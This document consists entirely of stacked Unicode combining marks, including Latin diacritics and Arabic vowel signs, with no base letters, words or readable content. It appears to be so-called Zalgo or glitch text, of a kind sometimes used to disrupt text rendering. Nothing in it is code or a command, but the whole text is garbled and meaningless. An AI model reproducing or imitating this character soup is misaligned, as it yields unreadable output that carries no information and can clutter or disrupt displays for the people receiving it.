̶̶̴̶ًٌٌٍٍََُُِِّّ͚͇͚͚͍͓͆́͐ͥ͒͟͠҉̶̵ًًًٌٌٌٍٍََُُُِِِّّ̡̧̛̟͓͇͓͈͍͔̪̜̹̙ͪ͒̂́ͮ̅͠͡͏ًٌٍَُِّ̰̺͙̪̑͊̊̕͘҉̸̶̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̡̩̺̤̝̼̗̯̙̻̗̟̂̓̄ͫͦ͒́͊ͣ͘͘̚͘͝҉̶̷̸̵ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̧̡̢̛̛̛̛̙̰̥̗̞̱͓͓̠̘̺̺̳̟̗̣̮͉̺̫̖̬̮̖͇̓͒́̀͌̎͂ͧ́͋ͣͤ̇͂͂̄̀́̀ͬ́͐̕͘̚͠͞͠͞͏̴̶̶̴ًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̨̳̰̺̥͔̝̜̫̖̬̯̜̖̳ͨͤ͑̏́̃̆̇ͭ̒̓̊̊̾͒̚͘͢͜͢͜͟͟͠͡͏̴̷ًًٌٌٍَُُِِّ͓̳͎͍͈̋ͩ͋̊́̒̃́͏̵ًٌٍٍَُِّ͇̗͆͛ͧ͗ͭ́͏ّ̅͏̶ًًٌٌٍٍَََُُِِّّ̡̨̢̪̣̺̣̟͇͗̈́̐̏̅̾̈́̓ͨͭ͘͏ًًًٌٌٍٍََُُِِّّ̪̹̥̼̯̱͙̗̀̽̂͋̋̄̀̂́̕͢͝҉̵̶̵ًًٌٌٌٍٍََُُُِِّّ͎͚̙̤͍̮͎̫͖͂̃̽͋ͭ̌̄ͬ̕̕͘͜͟͝͝҉̸̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̨̡̧̡̡̥̖͓͓͍̹̞̼̣̘̥̊̔́̎́ͣͭ̒͌͐̎̀̽̕̕̚͜͞͝͏ًٍَُّ̫͖̪̹̔ͬͣ҉̵̸̷̶̶ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِِّّّّّّّّ̧̢̢̨̢̨̢͇͓̲̟͇̝̜͍̘̹̟̳̰͚̦̯̭͖̼̠͙̭̤̺̜̣ͥ̅ͦͮ̂͊̋ͤͩ̐́͛̉̓̾ͧ͂́ͫ̃ͯ͌̄̊͐̈̈́̂̚͘̕͘͘̕͟͝͡͞͏ًًٌٌٍٍََُُِِّّ̗̪̖̥̱͎ͨͣ̆́̿̂́̃͋͒ͮ͜͟͡͞͠͡ͅ͏̸̷̷ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̨̡̛̘̘̬̼͉̣̠͙̪̦̪̩̜͙͔͋̎ͭ͊͂̒̍̾ͤ̓̋́͌͐̏ͭ̚͘͟͠ͅ͏ًًٌٌٍٍٍََُُِِّّ̧̧̛̗̟̜͕̰͙͚̗̯͖͒̄̀͊̒̑̚͘͜͝͝҉َّ҉ًٌُِ̛̟̭̰̀̔͏̷̷ًًٌٍٍََُِّّ̙̘̬̘̘͉ͪ͆ͭ̎ͬ̕͢͝ͅ҉̴ًٌٌٍٍََُُِِّّ̨̣̦͖̝̖̭͇͙̖̒̄ͮ̎̀̂ͦ̕͝͏ًٌٍُِّ̦͍̠̪ͭ̋̌̚ͅ͏̶ًًٌٍََُُِّ͈̟̖̒͐̑̆̕͡͠͏ًٌٌٍَُِِّ̧̮̩̻̪̤͆̏̿̒̀ͦ͝͠͞͡ͅ҉̴̵̶̶ًًًٌٌٍٍٍَََُُُِِّّّ̯̩͚͔̰̦̣̻͔̭̔̉̄͋ͦͮͥ̒̇́͜͟͡͝ͅ҉̵ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّّ̡̢̡̡̛͕̙̮̺̥̭͙̖̗̗̳̱̪ͧͩ̓͒͆͛ͭͤͯ̎̉ͣ̃ͫ̎͑̑͘̕͟͢͡͝͡͞ͅ҉̵ًًٌٌٍٍََُُِِّ̨͔͍̘͍̜̺͚ͤ̆͗̌́ͣ͘͞͞͡͏َّ̨̳̌҉̶̸̶ًًًًٌٌٌٍٍٍَََُُُُِِِّّّ̧̧̧̢̱̠͉̦̭̬̞̮͈̞ͥ́̄ͦ̀ͤ̅̋̓ͬ̕̚͟͞҉̷ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̨̢̡̡̢̧̢̨̛̛̻͙̩̹̞̲̠͙̗̳̥̝̼̗̟̩̮̱̖̱̞͎̳͚̻̯̲͖̦̟̫̥͙̃̔ͧͪ͂̀ͫ̋ͣ͒͐̿̎̉ͬ̓̂̑ͨͤ̌ͫͣ̆̚̕͟͜͢͝͞͞͝͞҉̴ًًٌٌٍٍََُُِِِّّ̛̛̺̹̙̩͚̭̟̀ͯ͋̀̅͂ͭͪ̐͜͢͞͠͏ًٌٍٍَُِّ̧̨̺̪̠̜ͧ͢͡҉َّ͚̳̏҉̶̴̶̸̷̸̶̷̵̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̨̡̢͇͉̼̻̥̰͚̮̖̲͈̪̖̺̱̞̳̺͔͉̤͇̻ͤ͗͛͑̀́̄ͭ̽̿͗̓̋͋̾̈́̒ͤͨͥ̊̓́́̒͑̓͛̔̈̓͊̎ͪ͛̂͑͑ͬ̒̚̚̕͟͜͜͟͜͜͝͝͞͝͝͝͝҉̸ًًًٌٌٌٍٍَََُُُِِّّ̡̨̖̞̜̻̖̞̀̌͐̑͗ͨ̄̌̀̃̍̈́́̇ͬ͟͞ͅ͏̴ًًٌٌٍٍٍََُُِِِّّّ̢̧̛̼̗̰͓͙̼̏ͮ́̒̔̋ͭ̈́ͨ͆͢͞͠͞ͅ҉̴̶̴̶̷ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّ̨̧̡̛͚͖̼̯̼̘̖̪̞͔̮͈͎̻͈̘͖͉̳͔̙̍̀͐͒ͫ̐̍̐͊̎͛̒̐̓ͤͦͭͯ̑ͬ͐͐̇̀̒̓̑͗̕̕͜͜͢͜͠͠͞͠͝ͅ͏̵̵̶̴̶̵̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّّ̡̨̢̧̛̛̙̻̖͉̗̣̣͖͇͉̳̰̘̜͉̰̠̳̣̮̲͖̭̯̮̅͋ͦ̽ͪ͗͒͂̀͗̉̋̆ͨ͒̎̎͛̄͑̚̕̕̕͟͜͝͡ͅ͏ًٌَُ̰̳̫̪́ͬ͒͊͘҉ِ̗͏̴̷̷̶̶̷̷̴̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّّ̢̡̧̡̡̛̛̣̥̯͓̜̰̜̻͚͇̳̣̭̥͖̦̭̫͎̣͇͔̘͖̫͍̹̘̺͖͈̘͍͈͓͙͎̺͔̥̊̀̒͋͊̉̽͆ͫ̎̏͑̿̓ͤͤͦ́ͬ̂͗ͮ͆̉̋̓̉ͩ͘͘͟͢͢͜͟͟͟͞͠͠͠͡ͅ҉ٌٍَُِّ̛̖̣̊̌̇͂ͣ͘͏̴ًٌٍُِ̪̭́͐̈͡͠͏ًًٌٍََُُِّّ̫͚̬̘͓̲ͦ͌̓́͛͜͝͡҉̶̷ًٌٌٍٍَُِِّ̡̡̬̗͈̮̹ͯ̉̄̾̽̍͊̕͘͝͏ّ̯̊͏̷̸̸̵̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̨̡̨̢̡̛͕̮̥̦̘͓͍̲̞̮̟̭͓͕̫͍̞̻̱̼͉̫̮̝̙͖̞̣̺͍̥͖̯͛̆́͛ͭ̓ͬ́ͦ̃͑ͩͪ͛̑͗̓ͥ͛̆̽ͥͩ̄͌ͬ̒̂̍̋͘̕͘͜͞͝͠͝҉ًًٌٌٌٍٍََُُِِّّ̢̨̨̛̭̳̩̮͉̲ͯ̎̀̿͘͡ͅ͏̴̵̶ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̨̢̢̳̝̬̺̭͓̺̝͈̖̜̖̜͎̞̥͓̰ͣ͗ͨ́̇̓̀̃ͣ̀̒͒͋̀̈́̕̚͝͝҉̴̴̷̴̷ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̨̧̢̯͇͖̤̻̟͎͖̩̻̬̱̲̟̞̘̥̥͍̠̰͍̔̌͌̌̈́͛̔ͩ́͆̇͋͆̏̓͗̚͜͟͞͠҉̸̵ًًٌٌٍٍََُُِِّ̤̣͉̼͚̭̪̜̲̮ͨ̎ͨ̀̊̒͊̍̕̚͝͏̵ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̢̢̡͎̪̲̪̥̱͖͔̩͕ͦͤ̀̾̃̑̏͐̄͒ͤ͂̏͘̕͘͢͠͠͡҉ًُ̝̔́͏̷̴ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̨̡̡̗̪͖̬̘͎̮̥̺̤̜͖̺̣̗͖̇̽ͧͧͫ̔̑ͬ͋̀ͧ̄͊̈̊̕͡͠͝͏ًٌٍُِ̪̝͎͕ͤ̽̋̈̕̕҉̸ًًٌٍََُِّّ̧̛̬̭̖̪̳͚ͬ͒ͭ͡͏ًًٌٌٍٍََُُُِِّّ̧̛̛͈͈͕̳̫̹͍̭̼̦̂̑͗̈́ͣ͒͛̊͜͞͠҉̸̷̵̶̸̵ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̧̧̛̛̻̻̺̣͓̝̫͉̞̱̟̯̜̲͔͇͍͓̼̫̗ͩ͐ͥ͊ͬͣͭ̓̀ͧ̈́̀̓̂̓̄̌ͩ̂͒ͧ͗̈́͛͛̅͊͟͟͢͢͢͟͟͝͞͠͠҉ٌٍُِّ̢͇̺̠̗̄͏ًَ͇̜̏͠҉̴ٌٍُِّ̗͉̘͊͟͏̷̴̶̵̸ًًًٌٌٌٍٍٍَََُُُِِِّّ̡̡̢̢̻͎̟͕̮̫͉̰̙͎̝ͮ́̆ͪ̒̉̀̚̚͢͞͠҉̴̵̸̷̸̴̴̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̨̡̧̨̤̯̬͙̟̜̻͉̩͙̫͎͎̱͎̣̝̤͈͍̳̩͓̯̭̗͕̂̎̈̅̇͑ͦ͂̐̄͆͛̊ͣͯ̉̊́͑ͯ̏ͧ͗̑̋ͩ̍ͩ̆̈̚̚̕͢͢͟͢͢͠͞҉̵̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̡̨̨̢̗͍͈̗̜̱͖̤͔̭̹͍̫͔͖̰̠̜̦̥͗̉̎́͛ͭ̀ͫ́̊́̒ͥͦͪͤͬ̑̕͘̕̕͜͢͞͞͞͡͡͠҉ً͓́҉̸ًًٌٌٌٍٍََُُُِِّّ̧̨̛̞͙̤͉͙͕̙̱̠̓̉͂̽̿̿̽́ͬ͝͏ٍِ̱̲̌̚҉̷̴̶̸̶̷̵̵̵̴ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّ̨̡̧̧̨̨̢̢͈͇̝͈̤̯̺͙͇͉̤͈̞̠͍̯̠̳͇̖̩̳͍͕̮͚̹̺̩͓͔̱̦͕͔̣͍̰͉̬͉͍̮͖͓̰̰̖̣͙̘̠͎̄̇̽ͧͮ̀ͯͣ̍ͬ́͗̉͛̎ͯ̀̑͒̇̇̆̊̓͌͐ͯ̓ͥͭ̔̃ͨ̏̎̌ͧ̋́̑͛̇̊̈̎ͤ͐̃̀̉ͭ͐̅͂̆͗̉̄̂̍ͭͭ̀͛̈̈͘͘̕͘̕͘͜͟͟͢͜͢͢͢͜͟͡͞͡͡͠͞͠͞͝ͅ͏̷ًٌَُ̱͇̓̎̏͠͠͏̴̷̶̸̸̵̵̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̧̡̡̨̨̧̛̤͍͈̹̻͖̥͉̫̙̹͖̺̠̺̭̘̙̫͙̣̰̲̩̱̪̽̈̅̍͋̂̏ͩ͂̃̇́̄̓̓̓̃ͯͯͣͪ̃̀̓̏̓̋ͨ̏ͦͫͭͣ̇͘͘̕͘̚͜͟͜͞͞͞͞͡͡͠͠͏ًٍَُّ͙̎́̌͠͏ٌٍِ̙̜͓ͭ̊͞҉̵̶̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̡̺͉̙̘͈̲͕̰͍̪͖ͦ̈̀̃̂̀̀̀ͧ̏͆͗ͬ͒̈̕̚͝͝͝͏̶̸ًًًٌٌٍٍَََُُِِّّّ̨̨̮̝̞͈̬͓̙̳͑̄̿ͧ̒͑͋̕͡͠͞҉ًٌٍَُُِّ͕̻̪͍͈͋̋̀̿͋̐͆͢͏̵̸̷ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̢̢̧̡̧̩͖̤̦͖̰͚̘͓͖͓̯̻̼̖̔ͭ̀͌͛ͬ͐̈́̀̍̌͒ͦ̏ͯͬ̍̀͘͘͢͟͢͡͠͏َّ̗̀҉̴̶̶̸ًًًًًٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̨̧̢̦̫̰̻̪͇̩̬̥̹͈̱͎͓̣̼͉̭̮̃́̍̀͆ͮ͛̏ͦ͒̊ͦ̀ͥͣ̂̿̓͋͊̆̈͢͟͞͡҉̷̷ًٌٌٍٍََُِِّّ̡̨̡̢̛̗͇̠̹͍̺͑̅̏ͬ͟͏ًًٌٍَُِّ̡͉͕̹͔͚̆̓̎͘͜͏̷̷ًًٌٌٍٍََُُُِِّّ̢̦͔̤̻̳͔̗̓̏́̿̈ͥͦͨ̍͐ͦ́ͨ̔̕͠͏̸ًًٌٌٌٍٍََُُِِّّ̧̨̼̪̟̙̙͈̥͈͓ͬ̎̑ͨ́̐̌ͥͨͧ͜͞͠͡҉̴ًٍَِّ̧͓̖̻̇̒̈́͏ٌُ̛̞̭ͩ͏ًٍَُِّ̗̖͉́̎͞͏ًٌٌٍَُِّ̨͔̳̩̺̰̒̀̔̀̌͆҉̶ًٍَِّ̺̗̩̻ͪ́͞͞҉̷̸ًًٌٌٍٍََُُُِِّّ̡̙̼̻̩̠̀͂̇̕͘͟͠ͅ҉ٌٍَِّ̛̬̟̩̳̉͠҉ً͏ٌٍَُِّ̨̞̱̗͇̋́͠҉̷ًًٌٌٍَُُِِّ̨̣̫̟̱̳͕̐̍͛͂ͯͭ̔̓͆͘͟͝҉̷̵̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̨̧̧̡̡̛͕͚̼͕̻̬̫̼̱͕̞̳̝͉̳͗͆̾ͨ̈́̎̓̂̍͂̊̌̋̕͞͡ͅ͏̵ًًٌٍٍََُُِِّّ̜̦̱̯͕̰̤̆̉́̀̏̅͟͞͞͏̸̶̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̡̨̗̟͚̭̩̮͉̣̦̲̗̪͖̺̺̹̓̇ͨͪ̀̀̀ͥͮ̑͋̿͌̄̏ͭͦ̓͆ͧ̊͌̈́̕̚͘͟͟͟͜͜͞͡͡͡ͅͅͅ҉ٍِ̞̓͢͏َّͣ̀̚҉̸̵̷ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̨̢̡̛͕͓͓̰̣̫̠͖̺̘̬̜̘͉̘̪͚͓̆͒̓̀ͨ̋̇̒ͬ̆ͫ͆̐ͨ͊̾̐̆͘͘͘̕̕͟͝҉̶̴̴ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̨̢͔͈̺̙̯̻̠͙̠͖̻͍̱̲̝ͯ̄̅́̓ͮͪ̃̉̌̅̑̕͜͡͞͡͠͞҉̸̶ًًًٌٌٌٍٍٍََََُُُِِِّّّ̧̨̢̧͇͓͚̪̞̟͓͔̣̙̦̼͆́̎̇̇̽͒̏̓ͯͩ̋̑̿̀̚͘̕͢͢͞͠҉̸ًُ̣̾҉̶̷̴̷̶ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̧̛̛̬͍̫̹̰͉͙̖̙̜͙̘͉̯̞̫̓̐̇͊̀̐̈ͫ͌̓͑͗̒ͩ̐ͫ̀̆͘͟͟͡͝҉̸̷ًٌَُّ̟̟̼̉̃̉͜͏̴̶̵̴̷̵̵̴̶̵̷ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّ̡̡̧̨̢̡̧̨̡̢̛̛̛̛̱̘͇̦̜͉͇̝̩̩̟̻̼͉̙̰͙̯̦̬̺͉̩̞̳͔̬̘͖̦͓̲̩͍̜̭͖͓̰̯̠̯̪̬̯͔̩͔̘͚̹͓̈́̐̉͐ͯ̀͌ͨ̆̊ͫͮ̀̌͐̓̉̇͆̄ͣ͊̑ͦ́͌͛̆͐̀̃̈́͊̄̀͗̆̃ͥ̆̿ͯ̉̓ͦ̍̐̀͌͐͑͑ͫ̌ͥ͋́̃ͩ̀̕̕̚̕̚̕̕͜͜͜͟͢͝͞͞͞͝͠͠͠͠͡͝ͅͅ͏ِ͏̸̴̶̵̵̴̴̷̵̷ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّّ̡̡̨̨̨̧̡̡̡̢̡̛̛̛͙̳̮̟̥̜͍̲̞͕̼̟̖̤̦͇̯̫̮̪͉̲̺̲͙̯̪͙̪̲͔̲̤̣͕͉̲̬̔̋̓ͧ͌̇ͬ̓ͫͦͯ̊́͛ͨ̍̿ͧ́̆̍̽̇̋̈̈́̓̀͑̀̀͌̍ͯ̇̓ͣ̚͘̚̚̚̕͢͢͜͟͢͜͠͡͡͞͝͠͠͝͞͡ͅͅ͏ً͏̶̴̶̸ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̡̧̨̧̡̛̛̹̭̗̝͇̗̙͈͓̜̠͓̙̞̪̦͓̘̜̺̝̞̳̺͈̻̣͙͉͙͋̋͛ͮͯ̅̒ͫͦͦ͒ͥͪͥ̎̉ͦ̾̈͒̍͂͒̅͊̿̅́ͦͩ͗̐͘͘̕̚͘͢͜͜͠͞͡͝͡͞͠͠҉̶ًَُ̖̮͒̈́͏ًٌٌٍَُِِّ̢͇̤̙̯͑̇͆̇̿͏̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̧̢̛͎͇̩̥͕̫̝̲̳̣̈́̒ͭͫ̉ͦͣ͗́͘̕͝͝͝͞҉ًٌٍٍََُِّّ̡̩̫̮͔̻͍̂́ͫ̐͜͏̸̴̷̷̶̵̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̧̡̛͈̣̺̲͖̤̙͇̰͈͍̮͙̳̙̜̭̫̠̥̝̯͉̭͓̞̗̦͓̯͇̝̝̲͓̭̮̻̺̇ͧͭͩ́̈ͧ̉͂͐́ͫ̓͂̔͛͋́́̊̉̌̐́̐̄̓ͬͥ͛̒̀̽ͣ̆̾̎ͤ̈́͘͘͜͟͟͜͡͠͞͝͞͡҉̷ًًٌٌٌٍٍٍََُُِِِّّّ̧̰̞̹͈̩͚͛̄̈ͧ͑͡͡ͅͅ҉ًٌٍَُِ̢̧̜̰ͤ̆҉̷̷̸̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̡̡̢̡̛̞̘̻̭͚̯̲͖̝͎̙̻͈̩̝̣͙̥̱̱̤̺̈́ͩ͊ͫ̇́͒ͮ̍͋̓̃̅͛̿͒ͪ̄͆ͬ͘͘̚͘͘͢͢͟͝͝͏ًُ̞̂̓҉̷̸̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̨̨̨̧̨̡̛̛̫̱̞͖̦̫̘̹̮̞̟̠͙͇̳̳͔̗̞̬̭̝̣̻̯̤̞̯͑̀̈̈́̀͐̀͌ͮ͆͆̆ͫͫ̆ͪ̆̊̿ͣ̾̐̂͌́́̓̐͂ͫ̍́̈́̀̃̅͑ͦ͘̚̕̚͟͢͢͜͟͜͟͢͢͝͞͡͞͞ͅ҉̷̷̴̶̷̵ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̧̛̪͈͉͉̱͙̠̱͙͎͉͇̯̬̙̟̻͖̥̪ͪͥͮ̀̏̌ͧ́͗͑̃̇̋̈́ͩ̃͂̐͛̂̃̕͘͟͟͜͢͞͡͝҉ٌ̎͏ٍِ̩̃͑҉̵ًًٌٍََُِّّ̨̨̤͇̾̏͗͊͟͝͏ٌُ͙̑҉̶̷̸̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̥̺͉̠̤̥ͥ͋̾̑͋ͭ̿̾͊ͦͦ̿̍ͤ̀̈́͛͑͘͟͢͡͞͡͏̷ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̡̢̗̼̞͎̦̻̣͖͔̟͇̟̘̑̔̔͋ͨͫ́̒́̚͘͟͟͟͜͝͞͞͠͏̵̷̶ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̡̢̢̛̛̣͔̰̩̠̫̜̭̤̬͔̙͚ͧ̂̍͂͒ͯ̑̂͊͐̑́ͧ̈́ͤ͋̅͢͡͞͡͝҉̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̧̛̹̺͍͇̣͍̳̬͖̪͕̻̺͎̳̼̩͚̮̠̳ͤ̾̌͑̊̎͂ͨ̐̑̊͊ͧ͗̚͘̕͟͢͢͞͡͏̸ٍِّ͇̭̦ͬͧ̚҉̵̸̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̡̨̨̡͖͓̯̥̘͇͉̰̮̅̑ͨ́̎͌̃͂͒̂͞͠͠҉̷ًًٌٍََُِّ̭̪͎̺͉̩̆ͨͦ̓ͣͦ̚͡҉̴̴̷ًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̧̡̛͖̯͇̱͖̪͖͙̙̑ͤ͋͗̌̇͗̚͟͟͜͢͞͞͞ͅ҉̷̴ًٌٍٍَُِّ̡̘̜̰͎̰̲̅ͭ̍̂̕҉َّ͔̇͏ًًٌٍَُِّ̡̛͎͉̖͈ͯ̀̊͞ͅ͏̵̷̵ًًٌٌٌٍٍََُُُِِّّ͎̜̹͉͍̙͈͙́̎́ͣ̄ͪ̀̎́͟͞҉ًٌٍٍََُِِّّ̧̘̭̹͉ͫ̀͂̕͢͜͞͏̷̴̷̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّ̡̡̨̛̛̛̛̠̖̳͍̺̩̖̥͖̞̘̪̻̙̰͉͔̞̤̳̪͚̤̱̪͈̟̅͒̎͌ͤ͋̂͐̄̍ͨ͆̾͌̎̂ͣͩ̄̄ͭͭ͘͜͟͜͢͠͏̴ًًٌٍََُِّّ̛̘̫̗͈̦̿̓̀ͣ̅͜҉̸̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̡̧̡̨̛̛̜̟̘̼̩͍̥͇͉̘̝̻̖̞̲̜̘̙̣̣ͪ̒ͣ̒̅ͪ͒̏́̓͌̒ͨͨ̌̏̂̎͐̌ͭ̆̍̐͋̓̓̚͘͘͜͟͜͟͞͞͡͠͝͠͞͝͞ͅͅ͏ًٌٌٍَُِِّ̱̙͇͕͓̤̉̀͂ͪͣ͢͏̴ًًٌٌٍٍٍََُُِِّّّ̛̲͉̞̘͉̘̙̭́͒̓̿͌͆͊͘͝͝ͅ͏ًًٌٌٍََُُِِّ̢̨̠̦̜̹̖̼̪̥̓́̃͛ͥ́͗̌̀̄͂ͩ͞͏̸̸ًٌٍٍََُِّّ̧͓̥͎̌ͨͩ̆̐̂̓̕ͅ҉̶̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̨̢̮͖͇͈̖̞̼̺͛ͯ̑̋̐̅̅̐̽͒̆̕͡͞͞ͅ҉ًًٌٌٍََُُِّ̡̮̥̜̞̭͊́̊̉̐̃̑͐̑͘͟͞҉̷ًٍَُِّ͚̰̖ͩ̀̌͏̷̵̶̵̵̵ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̡̧̮͕̠̙̳̹̹̙̠͈ͩ̌̎͒̐̋̒̀́͢͡͡͏̶̵ًٌٌٍَُِِّ͇͇̻̹ͯ̈̓̃͜͝͏̸̴̴̷̷̶̴̴̷̸̶ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّّ̧̢̧̨̨̢͇͚̟̬͍̦̲̥͈̠̩͕̱͙̘̦͙̳̪̞͍͍͖͉̦̫̱͋ͯ͋ͬ͛͐̀͋͒ͣͯ͌͒̾͊͆ͭ̓͊̐̐ͫͩ͋̈́͘͘͜͟͢͟͠͞͠͡͝͞͠͡͡҉̸̸ًٌٌٍٍََُُِِّّ̡̛̛̲͕̬̣̞̏͑ͤͫ̃͗͊̈́͠͏̶̸̵̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̡̛̛̛̛͖͖̭͕͖̯̥͓̝̰̙̪̥͉̝̪͓͚̠̺͇̘ͭ̓̆̊̿͆͗̒͆ͣͭͯ͐̔͆̃̿̉̕̕͘͟͢͠҉̴̶̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̡͚͚͚͈̟̟̭̼̫͓͕̟̞̰̘̣ͫͭ́̿̏́͐̑͒ͦ̽͆͊̔͆̊̐͘͜͞͝͡͠͡͠͝͝͏ًَُّ̤͇̙͆̌̕͠͏̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̛̛̩̣͙̟͕̰̼̣̗̯̖̞̻̪͕̺̻ͯͥ̏̑̊͆̿ͩ͐̂ͤͤ̄́̑̚̕͘͟͢͝͝͡͞ͅ҉̴ٌٍَِّ̢̢̠̹̝͍̅̒̈́̚̕҉̸̸̵̴̸̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̧̨̨̧̨̨̨̨̢̛̛̣̟̩̗͍̦̗̻̞͉̹̖̟͇̣͉̤̞̱̝͓̤̥̮̥̰͓̹̯͕̜̙͔̬̖͙̗̮̬̽ͬ̅̅̌̾̑̀͐̀͊ͩ̊̄ͥ̋ͨ̃͛̆̽̎̀̎͋̊̇͗ͯͣͪ̊̇̀ͪͮ̄ͪ̎̋̽̕̕̚͜͜͢͢͢͡͠͡͝͠͠͡͠ͅͅ͏ٌُ͔̿̃͏ًٍَُِّ̡̥̱̏ͨ̇̑̕҉̸̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̨̨̛̫̳͖̟͇̠̣̙̯̯̝̘̭̺͉̜̜̭͓̼͛̓ͨͥ̉̌̀͆͌̑͆͌ͧ̒̅͌̀̍ͧ̊̀͑̓̋̓̓̕͘͘͘͟͜͞͝͠͝͝ͅ͏̷ٌٍَِّ̢̗ͨͤ̚҉̷̴̷̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̧̧̨̡̧̡͚̠̝̼͔̯͎͚͈̥̥̲͎̩̗̲͙̘͖̻̖̈́͂ͥͧ̉͆ͥ̍ͣ̐ͬ́̐̐̑̒͊͑ͦͩ̕̕͘͟͝͞͠͡͏̶̶̴̷̴̸̵̷̵̷̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِّّّّّّّّ̧̨̢̡̛̯̫͚͚͚̙̺̤̲͇̥̱̠̗̜̺͓͈̰̼̲͐̓̿͒̌̀̅̊̀̔̉̂̃́̐̑ͪ̅ͤ͂͗ͭ̊ͬ͗͒̃̓ͫ̚͘̕͘͢͜͟͞͡͠͠͡͞҉̶ًٌٍَُِّ̬̥̖̀